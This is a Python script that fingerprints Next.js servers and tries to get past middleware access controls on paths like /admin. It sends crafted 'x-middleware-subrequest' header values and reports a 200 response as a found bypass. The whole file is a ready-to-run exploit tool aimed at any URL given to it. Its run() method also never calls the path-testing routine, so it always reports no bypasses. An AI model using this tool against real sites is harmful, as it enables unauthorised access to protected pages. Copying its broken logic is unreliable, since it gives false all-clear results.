import requests
import sys
import urllib.parse
import argparse
import colorama
from colorama import Fore
from typing import Dict, List, Tuple, Optional
import time

# Initialize colorama for cross-platform colored terminal output
colorama.init(autoreset=True)

class MiddlewareBypassTester:
    def __init__(self, base_url: str, paths: List[str], timeout: int = 5, verbose: bool = False):
        self.base_url = base_url
        self.paths = paths
        self.timeout = timeout
        self.verbose = verbose
        self.intervention_status_codes = [301, 302, 307, 308, 401, 403, 405]
        self.success_status = 200
        self.subrequest_headers = [
            {'x-middleware-subrequest': 'src/middleware:src/middleware:src/middleware:src/middleware:src/middleware'},
            {'x-middleware-subrequest': 'middleware:middleware:middleware:middleware:middleware'},
            {'x-middleware-subrequest': 'src/middleware'},
            {'x-middleware-subrequest': 'middleware'},
            {'x-middleware-subrequest': 'pages/_middleware'},
            {'x-middleware-subrequest': '1'},
        ]
        self.is_nextjs = False
        self.bypasses_found = 0
        self.interventions_found = 0

    def make_request(self, url: str, extra_headers: Optional[Dict[str, str]] = None) -> Tuple[Optional[int], Dict[str, str], Optional[str]]:
        """Makes a GET request and returns status code, headers, and error message."""
        headers = {'User-Agent': 'Recon-Tester/1.0'}
        if extra_headers:
            headers.update(extra_headers)

        status_code = None
        response_headers = {}
        error_msg = None
        
        try:
            request_url = url.split('#')[0]
            response = requests.get(
                request_url, 
                allow_redirects=False, 
                timeout=self.timeout, 
                headers=headers
            )
            status_code = response.status_code
            response_headers = response.headers
        except requests.exceptions.Timeout:
            error_msg = "Timeout"
        except requests.exceptions.ConnectionError:
            error_msg = "Connection Error"
        except requests.exceptions.RequestException as e:
            error_msg = f"Request Error: {e}"
            
        return status_code, response_headers, error_msg

    def check_server_type(self) -> bool:
        """Checks server headers, returns True if Next.js is detected."""
        print(f"{Fore.CYAN}[*] Server Check: {self.base_url}")
        status_code, headers, error = self.make_request(self.base_url)
        
        if error:
            print(f"{Fore.RED}  [!] Failed: {error}")
            return False
            
        if not status_code:
            print(f"{Fore.RED}  [!] Failed to get response")
            return False
            
        powered_by = headers.get('X-Powered-By', 'N/A')
        server = headers.get('Server', 'N/A')
        
        if self.verbose:
            print(f"{Fore.WHITE}  [+] Status: {status_code} | Server: {server[:20]} | X-Powered-By: {powered_by[:20]}")
            
        if 'next.js' in powered_by.lower():
            print(f"{Fore.GREEN}  [✓] Detected Next.js")
            return True
        
        print(f"{Fore.YELLOW}  [i] Next.js not detected from headers")
        return False

    def test_subrequest_headers(self, path: str) -> bool:
        """Tests multiple x-middleware-subrequest header values on the given path."""
        test_url = urllib.parse.urljoin(self.base_url + "/", path.lstrip('/'))
        if self.verbose:
            print(f"{Fore.BLUE}    [*] Testing bypass headers on: {path}")
        
        any_bypass_found = False

        for header_to_test in self.subrequest_headers:
            header_key = list(header_to_test.keys())[0]
            header_value = header_to_test[header_key]
            
            if self.verbose:
                print(f"{Fore.WHITE}      [*] Testing: {header_key}: {header_value[:30]}{'...' if len(header_value)>30 else ''}")

            status_code, _, error = self.make_request(test_url, extra_headers=header_to_test)
            status_str = f"{status_code}" if status_code else f"Error: {error}" if error else "Unknown Error"

            if status_code == self.success_status:
                print(f"{Fore.RED}        [!!!] {header_key}: {header_value} → Status: {status_str} {Fore.RED}[BYPASS FOUND]")
                any_bypass_found = True
                self.bypasses_found += 1
            elif self.verbose:
                print(f"{Fore.WHITE}        [i] Status: {status_str}")

        return any_bypass_found

    def check_path_status(self, path: str) -> Tuple[bool, bool]:
        """Checks the status of a specific path and attempts header bypass if intervention detected."""
        test_url = urllib.parse.urljoin(self.base_url + "/", path.lstrip('/'))
        print(f"{Fore.CYAN}[*] Path: {path}")
        
        status_code, _, error = self.make_request(test_url)
        status_str = f"{status_code}" if status_code else f"Error: {error}" if error else "Unknown Error"
        
        intervention_detected = False
        bypass_potentially_found = False

        if status_code in self.intervention_status_codes:
            print(f"{Fore.YELLOW}  [!] Status: {status_str} [INTERVENTION DETECTED]")
            intervention_detected = True
            self.interventions_found += 1
            bypass_potentially_found = self.test_subrequest_headers(path)
        elif error:
            print(f"{Fore.RED}  [!] Status: {status_str}")
        else:
            if self.verbose:
                print(f"{Fore.WHITE}  [+] Status: {status_str}")

        return intervention_detected, bypass_potentially_found

    def run(self) -> None:
        """Runs the test suite and displays results."""
        print(f"\n{Fore.CYAN}╔{'═' * 60}╗")
        print(f"{Fore.CYAN}║ {Fore.WHITE}Next.js Middleware Bypass Tester {' ' * 27}║")
        print(f"{Fore.CYAN}╚{'═' * 60}╝\n")
        
        print(f"{Fore.WHITE}Target: {Fore.YELLOW}{self.base_url}")
        if self.verbose:
            print(f"{Fore.WHITE}Paths to test: {Fore.YELLOW}{len(self.paths)}")
            print(f"{Fore.WHITE}Header variations: {Fore.YELLOW}{len(self.subrequest_headers)}")
        
        # Check if Next.js server
        self.is_nextjs = self.check_server_type()
        
        # Test paths
        print(f"\n{Fore.CYAN}[*] Testing {len(self.paths)} path(s)...")
        
        # Display summary
        print(f"\n{Fore.CYAN}╔{'═' * 60}╗")
        print(f"{Fore.CYAN}║ {Fore.WHITE}SCAN SUMMARY {' ' * 47}║")
        print(f"{Fore.CYAN}╚{'═' * 60}╝")
        
        if self.is_nextjs:
            print(f"{Fore.GREEN}[✓] Server identified as Next.js")
        else:
            print(f"{Fore.YELLOW}[i] Server not confirmed as Next.js (based on headers)")

        print(f"{Fore.WHITE}[i] Interventions detected: {Fore.YELLOW}{self.interventions_found}/{len(self.paths)}")
        
        if self.bypasses_found > 0:
            print(f"{Fore.RED}[!] Bypasses found: {self.bypasses_found}")
            print(f"{Fore.RED}[!] POTENTIAL VULNERABILITY: Review logs for bypass details")
        else:
            print(f"{Fore.GREEN}[✓] No bypasses found")

def main():
    parser = argparse.ArgumentParser(
        description="Next.js Middleware Reconnaissance & Header Bypass Test Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Example: python nextjs_bypass.py https://example.com /admin /dashboard --verbose"
    )
    parser.add_argument("base_url", help="Target base URL (e.g., http://localhost:3000)")
    parser.add_argument("paths", nargs='+', help="One or more paths to check (e.g., /dashboard /admin)")
    parser.add_argument("-t", "--timeout", type=int, default=5, help="Request timeout in seconds (default: 5)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    args = parser.parse_args()

    try:
        tester = MiddlewareBypassTester(
            base_url=args.base_url,
            paths=args.paths,
            timeout=args.timeout,
            verbose=args.verbose
        )
        tester.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Test aborted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()